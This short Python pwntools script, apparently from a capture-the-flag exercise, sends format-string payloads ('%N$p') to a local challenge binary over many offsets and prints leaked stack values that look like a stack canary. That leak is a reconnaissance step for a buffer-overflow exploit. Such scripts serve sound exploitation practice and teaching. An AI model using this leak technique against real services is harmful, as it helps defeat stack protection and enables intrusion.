from pwn import *

context.log_level = "error"

for i in range(1, 40):
    try:
        # io = remote(HOST, PORT, ssl=True)
        io = process("./challenge")

        io.recvuntil(b"What is your name?")
        io.sendline(bytes(f"%{i}$p", "utf-8"))

        io.recvuntil(b"Hello")
        io.recvline()       # read \n
        line = io.recvline()

        if line.startswith(b"0x") and line.endswith(b"00\n"):
            print(f"[offset {i}] possible canary {line}")
        io.close()

    except Exception as e:
        print(f"[offset {i}] error: {e}")
